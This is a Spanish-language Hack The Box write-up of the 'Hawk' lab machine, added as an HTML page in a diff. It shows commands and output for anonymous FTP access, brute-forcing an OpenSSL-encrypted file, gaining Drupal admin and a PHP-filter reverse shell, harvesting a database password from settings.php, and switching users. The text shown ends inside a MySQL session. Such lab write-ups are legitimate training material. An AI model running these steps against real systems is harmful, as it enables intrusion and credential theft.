@@ -1,0 +1,766 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Hawk (medium) · MiguelRega7</title>
+<meta name="description" content="- Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL conso"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Hawk (medium)</h1><div class="meta"><span>◷</span><time>2024-07-02</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL conso.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n">Enumeración</a><a href="#drupal">Drupal</a><a href="#shell-as-www-data">Shell as www-data</a><a href="#shell-as-daniel-and-user-flag">Shell as Daniel and User flag</a><a href="#escalada-de-privilegios">Escalada de privilegios</a><a href="#root-txt">root.txt</a><a href="#second-way">Second way</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/72d59997b352994c628a2b58b022b1d0.png">
+</p>
+
+<ul>
+<li>Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL consoles (RavenDB etc.) are found in many environments. The OpenSSL decryption challenge increases the difficulty of this machine.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Comenzamos escaneando los puertos abiertos y sus servicios que corren en los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo nmap -sCV -p21,22,80,5435,8082,9092 10.10.10.102 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 17:09 CST
+Nmap scan report for 10.10.10.102
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.14.63
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
+|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
+|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
+80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-generator: Drupal 7 (http://drupal.org)
+5435/tcp open  tcpwrapped
+8082/tcp open  http          H2 database http console
+|_http-title: H2 Console
+9092/tcp open  XmlIpcRegSvc?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9092-TCP:V=7.94SVN%I=7%D=7/2%Time=6684889E%P=x86_64-pc-linux-gnu%r(
+SF:NULL,45E,&quot;\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0
+SF:o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\
+SF:0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l
+SF:\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0
+SF:t\0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0o\0r\0g\0\.\0h\x0
+SF:02\0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\
+SF:0:\0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20
+SF:\0t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0
+SF:n\0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\
+SF:0A\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\
+SF:x001\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0
+SF:s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0
+SF:b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i
+SF:\0o\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\
+SF:0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\
+SF:0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a
+SF:\0:\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\
+SF:0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(
+SF:\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x005\x005\0\)
+SF:\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\
+SF:0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\
+SF:0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\0\t\0a\0t\0\x20\0
+SF:o\0r&quot;)%r(RTSPRequest,45E,&quot;\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0
+SF:\0\0F\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t
+SF:\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0
+SF:o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\
+SF:0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x01\xd8\0o
+SF:\0r\0g\0\.\0h\x002\0\.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e
+SF:\0p\0t\0i\0o\0n\0:\0\x20\0R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0
+SF:i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\
+SF:0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\
+SF:x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x0
+SF:01\x001\x007\0-\x001\x009\x006\0\]\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\
+SF:x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\
+SF:0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0
+SF:x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x003\x004\x005\0\)\0\n\0\t\0a
+SF:\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x
+SF:\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n
+SF:\0\.\0j\0a\0v\0a\0:\x001\x007\x009\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.
+SF:\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\
+SF:0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x0
+SF:01\x005\x005\0\)\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\
+SF:0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b
+SF:\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x001\x004\x004\0\)\0\n\0
+SF:\t\0a\0t\0\x20\0o\0r&quot;);
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<ul>
+<li>El puerto 80 corre un servicio web el cual usa como gestor de contenido un Drupal de versión 7 <a href="https://www.drupal.org/drupal-7.0/es">https://www.drupal.org/drupal-7.0/es</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-generator: Drupal 7 (http://drupal.org)
+</code></pre></div></div>
+<ul>
+<li><p>El puerto 21 esta abierto y corre <code>FTP</code> el cual tiene habilitado el <code>FTP</code> Anonymous el cual quiere decir que podemos habilitarnos sin necesidad de proporcionar contraseña.</p>
+</li>
+<li><p>Si nos conectamos vemos que no hay nada dentro del directorio <code>messages</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ftp 10.10.10.102
+Connected to 10.10.10.102.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.102:miguel): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; dir
+229 Entering Extended Passive Mode (|||46148|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
+226 Directory send OK.
+ftp&gt; cd messages
+250 Directory successfully changed.
+ftp&gt; dir
+229 Entering Extended Passive Mode (|||45380|)
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp&gt;
+</code></pre></div></div>
+<ul>
+<li>Sin embargo podemos ver archivos ocultos dentro de <code>messages</code> vemos un <code>.enc</code> <a href="https://www.reviversoft.com/es/file-extensions/enc?alid=547807047.1719962381">https://www.reviversoft.com/es/file-extensions/enc?alid=547807047.1719962381</a> en conclusión es un archivo cifrado.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">ftp&gt; ls -a
+229 Entering Extended Passive Mode (|||43596|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 .
+drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
+-rw-r--r--    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
+226 Directory send OK.
+ftp&gt; get .drupal.txt.enc
+local: .drupal.txt.enc remote: .drupal.txt.enc
+229 Entering Extended Passive Mode (|||48850|)
+150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
+100% |***************************************************************************|   240        2.60 MiB/s    00:00 ETA
+226 Transfer complete.
+240 bytes received in 00:00 (2.26 KiB/s)
+</code></pre></div></div>
+<ul>
+<li>Si vemos mas información nos habla sobre <code>openssl</code> además que se utilizo una contraseña con salt para el proceso de cifrado y los datos se codificaron en <code>base64</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ file .drupal.txt.enc
+.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
+</code></pre></div></div>
+<ul>
+<li>Como no conocemos la contraseña se vuelve mas complejo sin embargo hoy en día existen herramientas las cuales pueden aplicar fuerza bruta para saber la contraseña <a href="https://github.com/deltaclock/go-openssl-bruteforce">https://github.com/deltaclock/go-openssl-bruteforce</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ git clone https://github.com/deltaclock/go-openssl-bruteforce.git
+Cloning into 'go-openssl-bruteforce'...
+remote: Enumerating objects: 31, done.
+remote: Total 31 (delta 0), reused 0 (delta 0), pack-reused 31
+Receiving objects: 100% (31/31), 1.72 MiB | 2.84 MiB/s, done.
+Resolving deltas: 100% (13/13), done.
+❯ cd go-openssl-bruteforce
+❯ go mod tidy
+❯ go build -o openssl-brute
+</code></pre></div></div>
+<ul>
+<li>Ahora le pasamos el archivo y nos da la contraseña y el algoritmo con el cual fue encriptado.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ./openssl-brute --file .drupal.txt.enc
+Bruteforcing Started
+CRACKED!! Results in file [ result-aes256 ]
+--------------------------------------------------
+Found password [ friends ] using [ aes256 ] algorithm!!
+--------------------------------------------------
+Daniel,
+
+Following the password for the portal:
+
+PencilKeyboardScanner123
+
+Please let us know when the portal is ready.
+
+Kind Regards,
+
+IT department
+
+--------------------------------------------------
+</code></pre></div></div>
+<ul>
+<li>Podemos probar a conectarnos por ssh pero no nos deja.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat creds.txt
+Daniel:PencilKeyboardScanner123
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ssh daniel@10.10.10.102
+The authenticity of host '10.10.10.102 (10.10.10.102)' can't be established.
+ED25519 key fingerprint is SHA256:jcuqa44g/a1pFArv7e9IFSswe7plzlg2gNBVim3xXhY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.102' (ED25519) to the list of known hosts.
+daniel@10.10.10.102's password:
+Permission denied, please try again.
+daniel@10.10.10.102's password:
+Permission denied, please try again.
+daniel@10.10.10.102's password:
+daniel@10.10.10.102: Permission denied (publickey,password).
+</code></pre></div></div>
+<h2 id="drupal">Drupal</h2>
+<ul>
+<li>Nos hablan sobre un portal lo mas probable es que se refiera al Drupal 7 que vimos con Nmap.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/1.png">
+</p>
+
+<ul>
+<li>Si nos conectamos con la contraseña que vimos nos deja y como username usamos Admin.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/2.png">
+</p>
+
+<ul>
+<li>Podemos ir a Modules y en este caso como somos usuarios administradores podemos habilitar Path y PHP filter.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/3.png">
+</p>
+
+<ul>
+<li>Vamos añadir contenido.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/4.png">
+</p>
+
+<ul>
+<li>Damos Click en Basic Page.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/5.png">
+</p>
+
+<ul>
+<li>Vamos a ver si el PHP lo interpreta en Text format indicamos que es PHP code.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/6.png">
+</p>
+
+<ul>
+<li>Y vemos esto.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/7.png">
+</p>
+
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<ul>
+<li>Vamos a enviarnos una reverse shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nc -nlvp 433
+listening on [any] 433 ...
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hawk/8.png">
+</p>
+
+<ul>
+<li>Al darle a Save nos llega la shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nc -nlvp 433
+listening on [any] 433 ...
+connect to [10.10.14.63] from (UNKNOWN) [10.10.10.102] 53012
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">$ script /dev/null -c bash
+Script started, file is /dev/null
+www-data@hawk:/var/www/html$ ^Z
+[1]  + 25347 suspended  nc -nlvp 433
+❯ stty raw -echo; fg
+[1]  + 25347 continued  nc -nlvp 433
+                                    reset xterm
+ENTER
+www-data@hawk:/var/www/html$ export TERM=xterm
+</code></pre></div></div>
+<h2 id="shell-as-daniel-and-user-flag">Shell as Daniel and User flag</h2>
+<ul>
+<li>Vemos la flag en el directorio de Daniel.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">www-data@hawk:/home/daniel$ cat user.txt
+3c9bfe74f2f6661740425db2ac4f0c08
+www-data@hawk:/home/daniel$
+</code></pre></div></div>
+<ul>
+<li>Vemos una contraseña en los archivos de configuración.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">www-data@hawk:/var/www/html/sites/default$ cat settings.php | grep password
+ *   'password' =&gt; 'password',
+ * username, password, host, and database name.
+ *   'password' =&gt; 'password',
+ *   'password' =&gt; 'password',
+ *     'password' =&gt; 'password',
+ *     'password' =&gt; 'password',
+      'password' =&gt; 'drupal4hawk',
+ * by using the username and password variables. The proxy_user_agent variable
+# $conf['proxy_password'] = '';
+</code></pre></div></div>
+<ul>
+<li>Si migramos a Daniel se nos ejecuta python3.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">www-data@hawk:/var/www/html/sites/default$ su daniel
+Password:
+Python 3.6.5 (default, Apr  1 2018, 05:46:30)
+[GCC 7.3.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt;
+</code></pre></div></div>
+<ul>
+<li>Podemos ejecutar una bash.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.system(&quot;/bin/bash&quot;)
+daniel@hawk:/var/www/html/sites/default$ whoami
+daniel
+daniel@hawk:/var/www/html/sites/default$
+</code></pre></div></div>
+<ul>
+<li>También funcionan por SSH.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ssh daniel@10.10.10.102
+daniel@10.10.10.102's password:
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jul  3 00:17:56 UTC 2024
+
+  System load:  0.0               Processes:           176
+  Usage of /:   47.5% of 7.32GB   Users logged in:     0
+  Memory usage: 44%               IP address for eth0: 10.10.10.102
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+417 packages can be updated.
+268 updates are security updates.
+
+
+Last login: Sun Jul  1 13:46:16 2018 from dead:beef:2::1004
+Python 3.6.5 (default, Apr  1 2018, 05:46:30)
+[GCC 7.3.0] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; os.system(&quot;/bin/bash&quot;)
+daniel@hawk:~$
+</code></pre></div></div>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<ul>
+<li>Como estamos ante un Drupal podemos ver mas usuarios y sus hashes conectándonos al servicio de la base de datos la misma password para Daniel funciona.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@hawk:/var/www/html/sites/default$ mysql -u drupal -p
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 73
+Server version: 5.7.22-0ubuntu18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+
